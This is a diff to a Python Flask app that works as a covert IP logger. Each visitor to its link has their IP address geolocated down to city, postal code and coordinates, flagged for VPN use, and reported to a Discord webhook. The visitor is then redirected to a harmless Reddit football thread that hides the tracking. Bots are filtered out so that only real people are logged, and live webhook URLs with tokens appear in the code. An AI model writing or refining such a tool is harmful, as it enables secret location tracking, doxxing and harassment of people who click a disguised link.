@@ -6,69 +6,56 @@ import threading
 app = Flask(__name__)
 
 # Discord webhook
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430208752837066845/HFmlZHpwB_LgcbxjoFb47dvk4-5p6aWDDkKLVh_z2Oy_fBZT12DDkS4p-T8SXKkUEaTw"
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"
 
-# In-memory store of logged IPs today
+# Reddit redirect URL
+REDDIT_URL = "https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/"
+
+# In-memory store for unique IPs per day
 logged_ips_today = set()
 
-# Known cloud providers / datacenter keywords for VPN detection
+# Cloud / VPN detection keywords
 CLOUD_PROVIDERS = ["Amazon", "AWS", "Google Cloud", "DigitalOcean", "Hetzner", "Microsoft", "Azure", "Linode", "OVH"]
 
-# List of common bot keywords
+# Common bot keywords
 BOT_KEYWORDS = ["bot", "crawl", "spider", "wget", "curl", "python-requests"]
 
 def get_real_ip():
-    headers_to_check = [
-        "CF-Connecting-IP",
-        "X-Forwarded-For",
-        "X-Real-IP"
-    ]
-    for header in headers_to_check:
+    """Extract real client IP from headers or fallback."""
+    for header in ["X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP"]:
         ip = request.headers.get(header)
         if ip:
             return ip.split(",")[0].strip()
     return request.remote_addr
 
 def is_bot(user_agent: str) -> bool:
-    ua_lower = user_agent.lower()
-    return any(bot in ua_lower for bot in BOT_KEYWORDS)
+    ua = (user_agent or "").lower()
+    return any(k in ua for k in BOT_KEYWORDS)
 
 def get_visitor_info(ip, user_agent):
-    """Get detailed visitor info using ipapi with fallback"""
+    """Query ipapi for the exact IP and collect all info."""
     details = {}
+    url = f"https://ipapi.co/{ip}/json/"
+
     try:
-        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
-        if r.status_code == 200:
-            details = r.json()
+        resp = requests.get(url, timeout=6)
+        payload = resp.json() if resp.status_code == 200 else {}
+        details = payload
     except Exception as e:
-        print("Primary ipapi error:", e)
+        print(f"[ERROR] ipapi request failed for IP {ip}: {e}")
 
-    # Fallback if city/country missing
-    if not details.get("city") or not details.get("country_name"):
-        try:
-            r = requests.get("https://ipapi.co/json/", timeout=5)
-            if r.status_code == 200:
-                fallback = r.json()
-                for key in ["ip","city","region","country_name","country_code","postal","latitude","longitude","org"]:
-                    if not details.get(key) and fallback.get(key):
-                        details[key] = fallback[key]
-        except Exception as e:
-            print("Fallback ipapi error:", e)
-
-    lat = details.get("latitude", 0)
-    lon = details.get("longitude", 0)
-
-    # Detect VPN / Cloud IP
-    org = details.get("org", "Unknown ISP")
-    vpn_detected = any(cloud in org for cloud in CLOUD_PROVIDERS)
+    lat = details.get("latitude") or details.get("lat") or 0
+    lon = details.get("longitude") or details.get("lon") or 0
+    org = details.get("org") or details.get("asn_org") or "Unknown ISP"
+    vpn_detected = any(cloud.lower() in org.lower() for cloud in CLOUD_PROVIDERS)
 
     return {
         "ip": ip,
         "user_agent": user_agent,
-        "country": details.get("country_name", "Unknown"),
-        "region": details.get("region", "Unknown"),
-        "city": details.get("city", "Unknown"),
-        "zip": details.get("postal", "Unknown"),
+        "country": details.get("country_name") or "Unknown",
+        "region": details.get("region") or "Unknown",
+        "city": details.get("city") or "Unknown",
+        "zip": details.get("postal") or "Unknown",
         "lat": lat,
         "lon": lon,
         "org": org,
@@ -78,14 +65,13 @@ def get_visitor_info(ip, user_agent):
     }
 
 def send_to_discord(info):
-    """Send visitor info to Discord in embed"""
     vpn_text = "Yes 🚨" if info['vpn'] else "No ✅"
-
+    embed_color = 16711680 if info['vpn'] else 7506394  # red for VPN, teal otherwise
     embed = {
         "username": "🌍 Visitor Tracker",
         "embeds": [{
-            "title": f"🚶 New Visitor from {info['country']}",
-            "color": 7506394,
+            "title": f"🚶 New Visitor from {info['country']}" + (" (VPN/Cloud)" if info['vpn'] else ""),
+            "color": embed_color,
             "fields": [
                 {"name": "🖥️ IP Address", "value": f"`{info['ip']}`", "inline": False},
                 {"name": "📍 Location", "value": f"{info['city']}, {info['region']} ({info['country']})\nPostal: {info['zip']}", "inline": False},
@@ -97,11 +83,10 @@ def send_to_discord(info):
             "footer": {"text": f"Logged at {info['date']} {info['time']} GMT"}
         }]
     }
-
     try:
-        requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=5)
+        requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=6)
     except Exception as e:
-        print(f"Error sending to Discord: {e}")
+        print(f"[ERROR] Discord webhook failed: {e}")
 
 @app.route('/')
 def index():
@@ -110,28 +95,25 @@ def index():
 
     # Skip bots
     if is_bot(user_agent):
-        print(f"Skipped bot: {user_agent}")
-        return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")
+        return redirect(REDDIT_URL)
 
-    # Skip already logged IPs
+    # Skip already logged IP today
     if ip in logged_ips_today:
-        print(f"Already logged IP today: {ip}")
-        return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")
+        return redirect(REDDIT_URL)
 
+    # ✅ Only one webhook per visitor
     info = get_visitor_info(ip, user_agent)
     logged_ips_today.add(ip)
     send_to_discord(info)
 
-    return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")
+    return redirect(REDDIT_URL)
 
-# Optional: clear logged IPs every 24 hours
+# Reset logged IPs every 24 hours
 def clear_logged_ips():
     global logged_ips_today
     logged_ips_today = set()
-    # Schedule next clearing in 24 hours
     threading.Timer(86400, clear_logged_ips).start()
 
-# Start clearing loop
 clear_logged_ips()
 
 if __name__ == "__main__":
